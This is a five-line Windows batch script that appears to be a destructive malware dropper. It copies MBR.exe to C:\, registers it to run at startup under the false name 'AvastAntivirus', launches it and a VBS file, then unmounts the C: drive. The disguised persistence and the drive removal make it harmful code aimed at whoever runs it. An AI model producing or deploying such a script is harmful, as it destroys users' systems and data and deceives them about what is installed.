copy /y MBR.exe C:\
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AvastAntivirus /t REG_SZ /d "C:\MBR.exe"
start MBR.exe
msg.vbs
mountvol C: /d